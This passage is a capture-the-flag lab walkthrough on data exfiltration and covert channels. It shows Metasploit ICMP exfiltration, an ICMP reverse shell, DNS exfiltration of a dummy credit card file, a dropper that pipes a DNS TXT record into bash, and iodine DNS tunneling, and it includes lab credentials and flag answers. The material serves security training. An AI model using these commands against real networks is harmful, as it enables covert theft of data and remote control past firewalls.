We sent one ICMP packet using the ping command withÂ thm:tryhackmeÂ Data. Let's look at the Data section for this packet in the Wireshark.

![Checking Data Field in Wireshark](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png)  

Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using theÂ pingÂ command.

## ICMP Data Exfiltration

Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to useÂ MetasploitÂ to exfiltrate data. TheÂ MetasploitÂ framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a Beginning of File (BOF) trigger value. Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value. The following diagram shows the required steps for theÂ MetasploitÂ framework. Since we need theÂ MetasploitÂ Framework for this technique, then we need the AttackBox machine to perform this attack successfully.

![ICMP Data Exfiltration](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)  

Now from theÂ **AttackBox**, let's set up theÂ MetasploitÂ framework by selecting theÂ icmp_exfilÂ module to make it ready to capture and listen for ICMP traffic.Â One of the requirements for this module is to set theÂ BPF_FILTERÂ option, which is based on TCPDUMP rules,Â to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,

Set the BPF_FILTER in MSFÂ   

```markup
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
BPF_FILTER => icmp and not src ATTACKBOX_IP
```

We also need to select which network interface to listen to,Â eth0. Finally, executesÂ runÂ to start the module.

Set the interface in MSF  

```markup
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
INTERFACE => eth0
msf5 auxiliary(server/icmp_exfil) > run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
```

We preparedÂ icmp.thm.comÂ as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to theÂ icmp.thm.comÂ usingÂ thm:tryhackmeÂ credentials.

We have preinstalled theÂ [nping](https://nmap.org/nping/)Â tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of theÂ NMAPÂ suite tools.

First, we will send theÂ BOFÂ trigger from the ICMP machine so that theÂ MetasploitÂ framework starts writing to the disk.Â 

Sending the Trigger Value from the Victim  

```markup
thm@jump-box$ ssh thm@icmp.thm.com
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]
    
Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds
```

We sent one ICMP packet using theÂ npingÂ command withÂ --data-stringÂ argument. We specify the trigger value with the file nameÂ BOFfile.txt, set by default in theÂ MetasploitÂ framework. This could be changed fromÂ MetasploitÂ if needed!

Now check the AttackBox terminal. If everything is set correctly, theÂ MetasploitÂ framework should identify the trigger value and wait for the data to be written to disk.Â 

Let's start sending the required data and the end of the file trigger value from the ICMP machine.

Sending the Data and the End of the File Trigger Value  

```markup
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0312s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
RCVD (0.0328s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
RCVD (0.0703s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]
    
Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0354s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
RCVD (0.0358s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
RCVD (0.0748s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]
    
Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0364s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
RCVD (0.0369s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
RCVD (0.3760s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]
    
Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
thm@icmp-host:~#
```

Let's check our AttackBox once we have done sending the data and the ending trigger value.

Receiving Data in MSF  

```markup
msf5 auxiliary(server/icmp_exfil) > run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data received in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot
[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
```

Nice! We have successfully transferred data over the ICMP protocol using theÂ MetasploitÂ Framework. You can check the loot file mentioned in the terminal to confirm the received data.

## ICMPÂ C2Â Communication

Next, we will show executing commands over the ICMP protocol using theÂ [ICMPDoor](https://github.com/krabelize/icmpdoor)Â tool. ICMPDoor is an open-sourceÂ reverse-shell written in Python3 and scapy.Â The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.

![C2 Communication over ICMP](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png)  

We have prepared the tools needed forÂ C2Â communication over the ICMP protocol onÂ **JumpBox**Â and theÂ **ICMP-Host**Â machines. First, we need to log in to the ICMP machine,icmp.thm.com, and execute theÂ icmpdoorÂ binary as follows,

Run the icmpdoor command on the ICMP-Host Machine  

```markup
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
```

Note that we specify the interface to communicate over and the destination IP of the server-side.

Next, log in to the JumpBox and execute theÂ icmp-cncÂ binary to communicate with the victim,Â our ICMP-Host.Â Once the execution runs correctly, a communication channel is established over the ICMP protocol. Now we are ready to send the command that needs to be executed on the victim machine.Â 

The data that needs to be transferred  

```markup
thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: hostname
hostname
shell: icmp-host
```

Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP.Â As the previous terminal shows, we requested to execute theÂ hostnameÂ command, and we receivedÂ icmp-host.

To confirm that all communications go through the ICMP protocol, we capture the network traffic during the communication using tcpdump as the following:

![Capture ICMP traffic using tcpdump](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)

Once we follow the steps, we get our flag:

```
thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: getFlag
shell: [+] Check the flag: /tmp/flag.txt
shell: cat /tmp/flag.txt
shell: THM{g0t-1cmp-p4k3t!}
```

# Dns Configurations
---

## DNSÂ Configuration

To perform exfiltration via theÂ DNSÂ protocol, you need to control a domain name and set upÂ DNSÂ records, including NS, A, or TXT. Thus, we provide a web interface to make it easy for you to add and modify theÂ DNSÂ records. The following domain name is set up and ready for theÂ DNSÂ exfiltration task:Â tunnel.com.

To access the website, you may visit the following link:Â http://10.10.39.16/Â orÂ https://10-10-39-16.p.thmlabs.com/Â without the need for aÂ VPN.

![THM DNS Changer - The Main web interface](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b8b4c25e0eb4dd04f1aea8596bf9319e.png)

Once you chooseÂ the domain name, you can addÂ DNSÂ records and test and reset theÂ DNSÂ configuration if something goes wrong.

![DNS Management for tunnel.com](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/af468d0202712ac1890f5dacb135e532.png)  

New Attacker Machine

Note that we have added a new Attacker machine in Network 2, which has the following subdomain name and IP address:Â 

|   |   |   |
|---|---|---|
|**Domain Name**|**IP Address**|**Network Access**|
|attacker.thm.com|172.20.0.200|Network 2|

We will be using the Attacker machine to exfiltrate inÂ DNSÂ andÂ DNSÂ tunneling scenarios. The main goal is that the Attacker machine (on Network2) can access internal network devices of Network 1 through JumpBox.  

![DNS Tunneling Goal!](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png)  

## Nameserver forÂ DNSÂ Exfiltration

To successfully executeÂ DNSÂ exfiltration within the provided network or on the Internet, we need to set up a name server for the domain name we control as the following:

1. Add anÂ **A**Â record that points to the AttackBox's IP address.Â For example, Type:Â **A**, Subdomain Name:Â **t1ns**, Value:Â **AttackBox_IP**.
2. Add anÂ **NS**Â record that routesÂ DNSÂ queries to theÂ **A**Â records inÂ **step 1**. For example,Â Type:Â NS, Subdomain Name:Â t1, Value:Â t1ns.tunnel.com.

Ensure that for the NS value we specify the full domain name:Â t1ns.tunnel.com. Once the two records are added, the name serverÂ t1.tunnel.comÂ is ready to be used forÂ DNSÂ Exfiltration purposes.

If you choose not to set up your AttackBox, we set up a nameserver for the Attacker machine within our provided network, and it is ready to use as follows,

|   |   |   |
|---|---|---|
|**DNSÂ Record**|**Type**|**Value**|
|attNS.tunnel.com|A|172.20.0.200|
|att.tunnel.com|NS|attNS.tunnel.com|

Note that theÂ attNS.thm.comÂ IP address points to the newly added attacker machine in our network and itÂ is ready to be used in our environment between theÂ JumpBoxÂ andÂ Attacker forÂ DNSÂ tasks and purposes.

## Lab Recommendation

Even though you can use the AttackBox for this room, we recommend using theÂ **JumpBox**Â for most parts (TCP,Â SSH, ICMP,Â DNS) to avoid technical issues withÂ DNSÂ and networking. If you prefer to use the AttackBox for theÂ DNSÂ Tunneling task (task 10), you must change theÂ DNSÂ settings of the AttackBox toÂ 10.10.39.16.Â There are many ways to change theÂ DNSÂ settings in the AttackBox machine. However, the following is one of the stable solutions we found for our environment.

First, we need to edit theÂ YamlÂ Netplan configuration file.

Edit Netplan Configuration File  

```markup
root@AttackBox:~# nano /etc/netplan/aws-vmimport-netplan.yaml
```

Modify the Netplan configuration file and add theÂ **nameserver**Â section under theÂ **eth0**Â interface to be as the following:Â   

```markup
# Automatically generated by the vm import process
 network:
     ethernets:
         eth0:
             dhcp4: true
             optional: false
             nameservers:
                search: [tunnel.com]
                addresses: [10.10.39.16]
         ens5:
             dhcp4: true
             optional: false
     version: 2
```

Finally, apply the Netplan Changes (This may need to be run twice).  

Apply the Netplan Changes  

```markup
root@AttackBox:~# netplan apply
```

## DNSÂ Testing

Once you have access to the Jump machine, you need to make sure that theÂ DNSÂ is working correctly by testing it as follows:

Testing theDNSconfiguration  

```markup
thm@jump-box:~$ dig +short test.thm.com
127.0.0.1
thm@jump-box:~$ ping test.thm.com -c 1
PING test.thm.com (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 ms

--- test.thm.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
```

TheÂ DNSÂ server must resolve theÂ test.thm.comÂ andÂ test.tunnel.comÂ domain names toÂ 127.0.0.1, confirming that you're ready.

# Exfiltration over DNS
---

TheÂ DNSÂ protocol is a common protocol and Its primaryÂ purpose is to resolve domain names to IP addresses and vice versa. Even though theÂ DNSÂ protocol is not designed to transfer data, threat actors found a way to abuse and move data over it.Â This task shows a technique to exfiltrate data over theÂ DNSÂ protocol.

## What isÂ DNSÂ Data Exfiltration?

SinceÂ DNSÂ is not a transport protocol, many organizations don't regularly monitor theÂ DNSÂ protocol! TheÂ DNSÂ protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using theÂ DNSÂ protocol to hide their communications.

![DNS Protocol Limitations](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png)

TheÂ DNSÂ protocol has limitations that need to be taken into consideration, whichÂ are as follows,

- The maximum length of the Fully QualifiedÂ FQDNÂ domain name (including .separators) isÂ 255Â characters.
- The subdomain name (label) length must notÂ exceedÂ 63Â characters (not including .com, .net, etc).

Based on these limitations, we can use a limited number of characters to transfer data over the domain name. If we have a large file, 10 MB for example, it may need more than 50000Â DNSÂ requests to transfer the file completely. Therefore, it will be noisy traffic and easy to notice and detect.

Now let's discuss the Data Exfiltration overÂ DNSÂ requirements and steps, which are as follows:  

![Data Exfiltration - Data flow](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)  

1. An attacker registers a domain name, for example,Â **tunnel.com**Â 
2. The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
3. The malware or the attacker sends sensitive data from a victim machine to a domain name they controlâ€”for example, passw0rd.tunnel.com, whereÂ **passw0rd**Â is the data that needs to be transferred.
4. TheÂ DNSÂ request is sent through the localÂ DNSÂ server and is forwarded through the Internet.
5. The attacker's authoritativeÂ DNSÂ (malicious server) receives theÂ DNSÂ request.
6. Finally, the attacker extracts the password from the domain name.

## When do we need to use theÂ DNSÂ Data Exfiltration?

There are many use case scenarios, but the typical one is when theÂ firewallÂ blocks and filters all traffic. We can pass data orÂ TCP/UDPÂ packets through aÂ firewallÂ using theÂ DNSÂ protocol, but it is important to ensure that theÂ DNSÂ is allowed and resolving domain names to IP addresses.  

![Firewall Blocks not allowed TCP/UDP traffic](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e881336d12bd5f24d2167730adda0adc.png)  

## Modifying theÂ DNSÂ Records!

Now let's try to perform aÂ DNSÂ Data Exfiltration in the provided network environment. Note we will be using theÂ **tunnel.com**Â domain name in this scenario. We also provide a web interface to modify theÂ DNSÂ records ofÂ tunnel.comÂ to insert a Name Server (NS) that points to your AttackBox machine. Ensure to complete these settings in task 8.

## DNSÂ Data Exfiltration

Now let's explain the manualÂ DNSÂ Data Exfiltration technique and show how it works. Assume that we have aÂ creds.txtÂ file with sensitive data, such as credit card information. To move it over theÂ DNSÂ protocol, we need to encode the content of the file and attach it as a subdomain nameÂ as follows,

![Encoding Technique](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png)

1. Get the required data that needs to be transferred.
2. Encode the file using one of the encoding techniques.
3. Send the encoded characters as subdomain/labels.
4. Consider the limitations of theÂ DNSÂ protocol. Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters, and each subdomain label can't exceed 63 characters. If we do exceed these limits, we split the data and send moreÂ DNSÂ requests!

Now let's try to perform theÂ DNSÂ Data Exfiltration technique in the provided network environment.Â This section aims to transfer the content of theÂ creds.txtÂ file fromÂ victim2Â toÂ attacker.Â We will use theÂ att.tunnel.comÂ nameserver, pointing to the newly added machine (the attacker machine).

Important:Â You can use the AttackBox for this task butÂ ensure to update theÂ DNSÂ records and add an NS record that points to your AttackBox's IP address or use the preconfigured nameserverÂ att.tunnel.comÂ for the attacker machine.

The first thing to do is make the attacker machine ready to receive anyÂ DNSÂ request. Let's connect to the attacker machineÂ throughÂ SSH, which could be done from the Jump Box using the following credentials:Â thm:tryhackme.

Connect to the Attacker machine viaSSHClient from JumpBox  

```markup
thm@jump-box$ ssh thm@attacker.thm.com
```

Or from the AttackBox machine using theÂ 10.10.39.16Â and portÂ 2322Â as follows,

Connect to the Attacker machineÂ viaSSHClient from AttackBox  

```markup
root@AttackBox$ ssh thm@10.10.39.16 -p 2322
```

In order to receive anyÂ DNSÂ request, we need to capture the network traffic for any incomingÂ UDP/53 packets using theÂ tcpdumpÂ tool.

CapturingDNSrequests on the Attacker Machine  

```markup
thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v 
tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Once the attacker machine is ready, we can move to the next step which is toÂ connect to ourÂ victim2Â throughÂ SSH, which could be done from the Jump Box using the following credentials:Â thm:tryhackme.

Connect to Victim 2 viaSSHClient from JumpBox  

```markup
thm@jump-box$ ssh thm@victim2.thm.com
```

Or from the AttackBox machine using theÂ 10.10.39.16Â and portÂ 2122Â as follows,

Connect to Victim 2 viaSSHClient from AttackBox  

```markup
root@AttackBox$ ssh thm@10.10.39.16 -p 2122
```

On theÂ victim2Â machine, there is aÂ task9/credit.txtÂ file with dummy data.  

Checking the content of the creds.txt file  

```markup
thm@victim2$ cat task9/credit.txt
Name: THM-user
Address: 1234 Internet, THM
Credit Card: 1234-1234-1234-1234
Expire: 05/05/2022
Code: 1337
```

In order to send the content of a file, we need to convert it into a string representation which could be done using any encoding representation such as Base64, Hex, Binary, etc. In our case,Â we encode the file using Base64 as follows,  

Encoding the Content of the credit.txt File  

```markup
thm@victim2$ cat task9/credit.txt | base64
TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
```

Now that we have the Base64 representation, we need to split it into one or multipleÂ DNSÂ requests depending on the output's length (DNSÂ limitations) and attach it as a subdomain name. Let's show both ways starting with splitting for multipleÂ DNSÂ requests.

Splitting the content into multipleDNSrequests  

```markup
thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' 
TmFtZTogVEhNLXVzZX.att.tunnel.com
IKQWRkcmVzczogMTIz.att.tunnel.com
NCBJbnRlcm5ldCwgVE.att.tunnel.com
hNCkNyZWRpdCBDYXJk.att.tunnel.com
OiAxMjM0LTEyMzQtMT.att.tunnel.com
IzNC0xMjM0CkV4cGly.att.tunnel.com
ZTogMDUvMDUvMjAyMg.att.tunnel.com
pDb2RlOiAxMzM3Cg==.att.tunnel.com
```

In the previous command, we read the file's content and encoded it using Base64. Then, we cleaned the string by removing the new lines and gathered every 18 characters as a group. Finally, we appended the name server "att.tunnel.com" for every group.Â 

Let's check the other way where we send a singleÂ DNSÂ request, which we will be using for our data exfiltration. This time,Â we split every 18 characters with a dot "." and add the name server similar to what we did in the previous command.

Splitting the content into a singleDNSrequest  

```markup
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com
```

Next, from theÂ victim2Â machine, we send the base64 data as a subdomain name with considering theÂ DNSÂ limitation as follows:  

Send the Encoded data via the dig command  

```markup
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```

With some adjustments to the singleÂ DNSÂ request, we created and added the dig command to send it over theÂ DNS, and finally, we passed it to the bash to be executed. If we check the Attacker's tcpdump terminal, we should receive the data we sent fromÂ victim2.  

Receiving the Data Using tcpdump  

```markup
thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
22:14:00.287440 IP (tos 0x0, ttl 64, id 60579, offset 0, flags [none], proto UDP (17), length 104)
    172.20.0.1.56092 > attacker.domain: 19543% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76)
22:14:00.288208 IP (tos 0x0, ttl 64, id 60580, offset 0, flags [none], proto UDP (17), length 235)
    172.20.0.1.36680 > attacker.domain: 23460% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207)
22:14:00.289643 IP (tos 0x0, ttl 64, id 48564, offset 0, flags [DF], proto UDP (17), length 69)
    attacker.52693 > 172.20.0.1.domain: 3567+ PTR? 1.0.20.172.in-addr.arpa. (41)
22:14:00.289941 IP (tos 0x0, ttl 64, id 60581, offset 0, flags [DF], proto UDP (17), length 123)
    172.20.0.1.domain > attacker.52693: 3567 NXDomain* 0/1/0 (95)
```

Once ourÂ DNSÂ request is received, we can stop the tcpdump tool and clean the received data byÂ removing unwanted strings, and finally decodeÂ back the data using Base64 as follows,

Cleaning and Restoring the Receiving Data  

```markup
thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
Name: THM-user
Address: 1234 Internet, THM
Credit Card: 1234-1234-1234-1234
Expire: 05/05/2022
Code: 1337
```

Nice! We have successfully transferred the content of theÂ credit.txtÂ over theÂ DNSÂ protocol manually.

## C2Â Communications overÂ DNS

C2Â frameworks use theÂ DNSÂ protocol for communication, such as sending a command execution request and receiving execution results over theÂ DNSÂ protocol. They also use the TXTÂ DNSÂ record to run a dropper to download extra filesÂ on a victim machine.Â This section simulates how to execute a bash script over theÂ DNSÂ protocol. We will be using the web interface to add aÂ TXTÂ DNSÂ record to theÂ tunnel.comÂ domain name.

For example, let's say we have a script that needs to be executed in a victim machine. First, we need to encode the script as a Base64 representation and then create a TXTÂ DNSÂ record of the domain name you control with the content of the encoded script. The following is an example of the required script that needs to be added to the domain name:  

```bash
#!/bin/bash 
ping -c 1 test.thm.com
```

The script executes the ping command in a victim machine and sends one ICMP packet toÂ test.tunnel.com. Note that the script is an example, which could be replaced with any content. NowÂ save the script to/tmp/script.shÂ using your favorite text editor and thenÂ encode it with Base64 as follows,

Encode the Bash Script as Base64 Representation  

```markup
thm@victim2$ cat /tmp/script.sh | base64 
IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=
```

Now that we have the Base64 representation of our script, we add it as aÂ TXTÂ DNSÂ record to the domain we control, which in this case, theÂ tunnel.com. You can add it through the web interface we provideÂ http://10.10.39.16/Â orÂ https://10-10-39-16.p.thmlabs.com/Â without using aÂ VPN.Â 

Once we added it, let's confirm that we successfully created the script'sÂ DNSÂ record byÂ asking the localÂ DNSÂ server to resolve the TXT record of theÂ script.tunnel.com. If everything is set up correctly, we should receive the content we added in the previous step.Â   

![DNS Server - Resolving TXT Record](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38b87cfbbe254bef1e98f0dffa49451f.png)  

Confirm the TXT record is Added Successfully  

```markup
thm@victim2$ dig +short -t TXT script.tunnel.com
```

We used the dig command to check the TXT record of ourÂ DNSÂ record that we added in the previous step! As a result, we can get the content of our script in the TXT reply. Now we confirmed the TXT record, let's execute it as follows,

Execute the Bash Script!  

```markup
thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```

Note that we cleaned the output before executing the script usingÂ trÂ and deleting any double quotesÂ ". Then, we decoded the Base64 text representation usingÂ base64 -dÂ and finally passed the content to theÂ bashÂ command to execute.Â 

Now replicate theÂ C2Â Communication steps to execute the content of the flag.tunnel.com TXT record and answer the question below.


After we did all that, we get:

```
THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}
```

# DNS Tunneling
---

This task will show how to create a tunnel through theÂ DNSÂ protocol. Ensure that you understand the concept discussed in the previous task (Exifltration overÂ DNS), asÂ DNSÂ Tunneling tools work based on the same technique.

## DNSÂ Tunneling (TCPoverDNS)  

This technique is also known asÂ TCPÂ overÂ DNS, where an attacker encapsulates other protocols, such asÂ HTTPÂ requests, over theÂ DNSÂ protocol using theÂ DNSÂ Data Exfiltration technique.Â DNSÂ Tunneling establishes a communication channel where data is sent and received continuously.

![DNS Tunneling - Data Flow](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8176731af9ec61cf248cdbc65df92172.png)  

This section will go through the steps required to establish a communication channel over theÂ DNS. We will apply the technique to the network infrastructure we provided (**JumpBox**Â andÂ **Victim2**) to pivot from Network 2 (192.168.0.0/24) to Network 1 (172.20.0.0/24) and access the internal web server. For more information about the network infrastructure, please check task 2.

We will be using theÂ [iodine](https://github.com/yarrick/iodine)Â tool for creating ourÂ DNSÂ tunneling communications. Note that we have already installedÂ [iodine](https://github.com/yarrick/iodine)Â on the JumpBox and Attacker machines.Â To establishÂ DNSÂ tunneling, we need to follow the following steps:

1. Ensure to update theÂ DNSÂ records and create new NS points to your AttackBox machine (Check Task 8), or you can use the preconfigured nameserver, which points to the Attacker machine (att.tunnel.com=172.20.0.200).
2. RunÂ **iodined**Â server from AttackBox or the Attacker machine. (note for theÂ **server**Â side we use iodine**d**)
3. On JumpBox, run the iodine client to establish the connection. (note for the client side we use iodine - withoutÂ **d)**
4. SSHÂ to the machine on the created network interface to create aÂ proxyÂ overÂ DNS. We will be using the -D argument to create a dynamic port forwarding.
5. Once anÂ SSHÂ connection is established, we can use the local IP and the local port as aÂ proxyÂ in Firefox or ProxyChains.

Let's follow the steps to create aÂ DNSÂ tunnel. First, let's run the server-side application (iodined) as follows,

Running iodined Server  

```markup
thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                                                                                                                     
Opened dns0
Setting IP of dns0 to 10.1.1.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com
```

Let's explain the previous command a bit more:

- Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over theÂ DNS.
- The -f argument is to run the server in the foreground.
- The -c argument is to skip checking the client IP address and port for eachÂ DNSÂ request.
- The -P argumentÂ is to set a password for authentication.
- Â The 10.1.1.1/24 argument is to set the network IP for the new network interface (dns0). The IP address of the server will be 10.1.1.1 and the client 10.1.1.2.
- att.tunnel.com is the nameserver we previously set.

On the JumpBox machine, we need to connect to the server-side application. To do so, we need to execute the following:

Victim Connects to the Server  

```markup
thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com                                                                                                           
Opened dns0                                                                                                                                                     
Opened IPv4 UDP socket                                                                                                                                          
Sending DNS queries for att.tunnel.com to 127.0.0.11                                                                                                            
Autodetecting DNS query type (use -T to override).                                                                                                              
Using DNS type NULL queries                                                                                                                                     
Version ok, both using protocol v 0x00000502. You are user #0                                                                                                   
Setting IP of dns0 to 10.1.1.2                                                                                                                                  
Setting MTU of dns0 to 1130                                                                                                                                     
Server tunnel IP is 10.1.1.1                                                                                                                                    
Testing raw UDP data to the server (skip with -r)                                                                                                               
Server is at 172.20.0.200, trying raw login: OK                                                                                                                 
Sending raw traffic directly to 172.20.0.200                                                                                                                    
Connection setup complete, transmitting data.
```

